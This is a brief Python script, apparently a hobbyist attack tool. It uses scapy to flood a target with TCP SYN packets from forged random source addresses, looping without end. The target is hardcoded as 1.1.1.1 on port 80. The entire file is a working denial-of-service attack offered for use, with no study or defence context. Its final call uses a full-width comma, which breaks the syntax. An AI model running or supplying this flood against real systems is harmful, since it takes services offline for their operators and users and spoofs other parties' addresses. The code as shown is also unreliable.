# -*- coding:utf-8 -*-
import random
import struct
from scapy.all import *

def synFlood(tgt, dPort):
	while True:
		for sPort in range(1024,65535):
			sIP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))) #产生随机IP
			ipLayer = IP(src=sIP, dst=tgt) 
			tcpLayer = TCP(sport=sPort, dport=dPort,flags="S") 
			packet = ipLayer / tcpLayer 
			send(packet)

if __name__ == '__main__':
	synFlood("1.1.1.1"，80)    #目标IP
